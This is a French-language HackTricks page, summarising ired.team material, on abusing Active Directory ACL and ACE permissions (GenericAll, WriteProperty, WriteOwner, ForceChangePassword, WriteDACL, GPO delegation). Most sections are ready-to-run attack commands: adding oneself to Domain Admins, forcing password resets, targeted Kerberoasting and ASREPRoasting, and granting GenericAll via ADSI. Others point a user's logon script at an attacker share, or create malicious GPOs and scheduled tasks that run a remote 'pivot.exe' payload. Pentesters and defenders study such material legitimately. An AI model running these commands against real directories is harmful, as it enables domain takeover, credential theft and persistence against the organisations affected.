# Abuser des ACLs/ACEs d'Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Cette page est principalement un résumé des techniques de** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **et** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Pour plus de détails, consultez les articles originaux.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

Ce droit accorde à un attaquant le contrôle total d'un compte utilisateur ciblé. Une fois les droits `GenericAll` confirmés avec la commande `Get-ObjectAcl`, un attaquant peut :

- **Changer le mot de passe de la cible** : En utilisant `net user <username> <password> /domain`, l'attaquant peut réinitialiser le mot de passe de l'utilisateur.
- **Targeted Kerberoasting** : Attribuer un SPN au compte de l'utilisateur pour le rendre kerberoastable, puis utiliser Rubeus et targetedKerberoast.py pour extraire et tenter de casser les hashes du ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Désactiver la pré-authentification pour l'utilisateur, rendant son compte vulnérable à ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **Droits GenericAll sur un groupe**

Ce privilège permet à un attaquant de manipuler les appartenances aux groupes s'il dispose des droits `GenericAll` sur un groupe tel que `Domain Admins`. Après avoir identifié le nom distingué du groupe avec `Get-NetGroup`, l'attaquant peut :

- **S'ajouter au groupe `Domain Admins`** : Cela peut être fait via des commandes directes ou en utilisant des modules tels que Active Directory ou PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Depuis Linux, vous pouvez également utiliser BloodyAD pour vous ajouter à des groupes arbitraires lorsque vous détenez GenericAll/Write membership sur ceux-ci. Si le groupe ciblé est imbriqué dans “Remote Management Users”, vous obtiendrez immédiatement un accès WinRM sur les hôtes qui prennent en compte ce groupe :
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Détenir ces privilèges sur un objet ordinateur ou un compte utilisateur permet de :

- **Kerberos Resource-based Constrained Delegation** : Permet de prendre le contrôle d'un objet ordinateur.
- **Shadow Credentials** : Utilisez cette technique pour vous faire passer pour un ordinateur ou un compte utilisateur en exploitant les privilèges afin de créer des shadow credentials.

## **WriteProperty on Group**

Si un utilisateur dispose des droits `WriteProperty` sur tous les objets pour un groupe spécifique (par ex., `Domain Admins`), il peut :

- **Se rajouter au groupe Domain Admins** : Réalisable en combinant les commandes `net user` et `Add-NetGroupUser`, cette méthode permet une élévation de privilèges au sein du domaine.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) sur un groupe**

Ce privilège permet aux attaquants de s'ajouter à des groupes spécifiques, comme `Domain Admins`, en utilisant des commandes qui manipulent directement l'appartenance aux groupes. L'utilisation de la séquence de commandes suivante permet l'auto-ajout :
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Un privilège similaire, il permet aux attaquants de s'ajouter directement à des groupes en modifiant les propriétés des groupes s'ils disposent du droit `WriteProperty` sur ces groupes. La confirmation et l'exécution de ce privilège se font avec :
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Détenir le `ExtendedRight` sur un utilisateur pour `User-Force-Change-Password` permet de réinitialiser le mot de passe sans connaître le mot de passe actuel. La vérification de ce droit et son exploitation peuvent être effectuées via PowerShell ou d'autres outils en ligne de commande, offrant plusieurs méthodes pour réinitialiser le mot de passe d'un utilisateur, y compris des sessions interactives et des one-liners pour des environnements non interactifs. Les commandes vont d'appels simples PowerShell à l'utilisation de `rpcclient` sur Linux, démontrant la polyvalence des vecteurs d'attaque.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner sur un groupe**

Si un attaquant découvre qu'il dispose des droits `WriteOwner` sur un groupe, il peut en changer le propriétaire pour se l'attribuer. Cela a un impact particulier lorsque le groupe concerné est `Domain Admins`, car modifier la propriété permet un contrôle plus large sur les attributs du groupe et son appartenance. Le processus consiste à identifier l'objet correct via `Get-ObjectAcl` puis à utiliser `Set-DomainObjectOwner` pour modifier le propriétaire, soit par SID, soit par nom.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Cette permission permet à un attacker de modifier les propriétés d'un user. Plus précisément, avec l'accès `GenericWrite`, l'attacker peut modifier le chemin du logon script d'un user pour exécuter un malicious script lors du logon de l'user. Cela s'effectue en utilisant la commande `Set-ADObject` pour mettre à jour la propriété `scriptpath` de l'user ciblé afin de la faire pointer vers le script de l'attacker.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Avec ce privilège, les attaquants peuvent manipuler l'appartenance aux groupes, par exemple en s'ajoutant eux‑mêmes ou en ajoutant d'autres utilisateurs à des groupes spécifiques. Ce processus implique la création d'un objet d'identification, son utilisation pour ajouter ou supprimer des utilisateurs d'un groupe, et la vérification des modifications d'appartenance avec des commandes PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Posséder un objet AD et disposer des privilèges `WriteDACL` sur celui-ci permet à un attaquant de s'octroyer des privilèges `GenericAll` sur l'objet. Cela s'effectue via la manipulation d'ADSI, offrant un contrôle total de l'objet et la possibilité de modifier ses appartenances aux groupes. Cependant, des limitations existent lorsqu'on tente d'exploiter ces privilèges en utilisant les cmdlets `Set-Acl` / `Get-Acl` du module Active Directory.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Réplication sur le domaine (DCSync)**

The DCSync attack leverages specific replication permissions on the domain to mimic a Domain Controller and synchronize data, including user credentials. This powerful technique requires permissions like `DS-Replication-Get-Changes`, allowing attackers to extract sensitive information from the AD environment without direct access to a Domain Controller. [**Learn more about the DCSync attack here.**](../dcsync.md)

## Délégation GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Délégation GPO

L'accès délégué pour gérer les Group Policy Objects (GPOs) peut présenter des risques de sécurité importants. Par exemple, si un utilisateur tel que `offense\spotless` se voit déléguer des droits de gestion des GPO, il peut disposer de privilèges comme **WriteProperty**, **WriteDacl**, et **WriteOwner**. Ces permissions peuvent être détournées à des fins malveillantes, comme identifié avec PowerView : `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Énumérer les permissions GPO

Pour identifier les GPO mal configurées, les cmdlets de PowerSploit peuvent être chaînées. Cela permet de découvrir les GPO qu'un utilisateur spécifique peut gérer : `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Ordinateurs avec une politique donnée appliquée** : Il est possible de déterminer quels ordinateurs concernent une GPO spécifique, ce qui aide à comprendre l'étendue de l'impact potentiel. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Politiques appliquées à un ordinateur donné** : Pour voir quelles politiques sont appliquées à un ordinateur particulier, on peut utiliser des commandes comme `Get-DomainGPO`.

**OUs avec une politique donnée appliquée** : Identifier les unités d'organisation (OUs) affectées par une politique donnée peut se faire avec `Get-DomainOU`.

Vous pouvez aussi utiliser l'outil [**GPOHound**](https://github.com/cogiceo/GPOHound) pour énumérer les GPO et y déceler des problèmes.

### Abuse GPO - New-GPOImmediateTask

Les GPO mal configurées peuvent être exploitées pour exécuter du code, par exemple en créant une tâche planifiée immédiate. Cela peut servir à ajouter un utilisateur au groupe Administrateurs locaux sur les machines concernées, élevant considérablement les privilèges :
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Le GroupPolicy module, s'il est installé, permet la création et l'association de nouveaux GPOs, ainsi que la configuration de préférences telles que des valeurs de registre pour exécuter des backdoors sur les ordinateurs concernés. Cette méthode nécessite que le GPO soit mis à jour et qu'un utilisateur se connecte à l'ordinateur pour l'exécution :
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse offre une méthode pour abuser des GPOs existantes en ajoutant des tâches ou en modifiant des paramètres sans avoir besoin de créer de nouvelles GPOs. Cet outil nécessite la modification de GPOs existantes ou l'utilisation des outils RSAT pour en créer de nouvelles avant d'appliquer les modifications :
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forcer la mise à jour des GPO

Les mises à jour des GPO ont généralement lieu toutes les ~90 minutes. Pour accélérer ce processus, surtout après avoir appliqué une modification, la commande `gpupdate /force` peut être utilisée sur l'ordinateur cible pour forcer une mise à jour immédiate des stratégies. Cette commande garantit que les modifications des GPO sont appliquées sans attendre le prochain cycle automatique.

### Sous le capot

En examinant les tâches planifiées (Scheduled Tasks) pour une GPO donnée, comme `Misconfigured Policy`, on peut confirmer l'ajout de tâches telles que `evilTask`. Ces tâches sont créées via des scripts ou des outils en ligne de commande visant à modifier le comportement du système ou à escalader des privilèges.

La structure de la tâche, telle que présentée dans le fichier de configuration XML généré par `New-GPOImmediateTask`, décrit les spécificités de la tâche planifiée — y compris la commande à exécuter et ses déclencheurs. Ce fichier représente la manière dont les tâches planifiées sont définies et gérées au sein des GPO, fournissant un moyen d'exécuter des commandes ou des scripts arbitraires dans le cadre de l'application des stratégies.

### Utilisateurs et groupes

Les GPO permettent également de manipuler les appartenances aux utilisateurs et groupes sur les systèmes cibles. En modifiant directement les fichiers de stratégie Users and Groups, un attaquant peut ajouter des utilisateurs à des groupes privilégiés, comme le groupe local `administrators`. Cela est possible via la délégation des permissions de gestion des GPO, qui permet de modifier les fichiers de stratégie pour inclure de nouveaux utilisateurs ou changer les appartenances aux groupes.

Le fichier de configuration XML pour Users and Groups décrit comment ces changements sont implémentés. En ajoutant des entrées à ce fichier, des utilisateurs spécifiques peuvent se voir accorder des privilèges élevés sur les systèmes affectés. Cette méthode offre une approche directe d'escalade de privilèges via la manipulation des GPO.

De plus, d'autres méthodes pour exécuter du code ou maintenir la persistance peuvent être envisagées, telles que l'utilisation de scripts de connexion/déconnexion, la modification des clés de registre pour les autoruns, l'installation de logiciels via des fichiers .msi, ou l'édition de configurations de services. Ces techniques fournissent diverses voies pour maintenir l'accès et contrôler les systèmes cibles par l'abus des GPO.

## Références

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
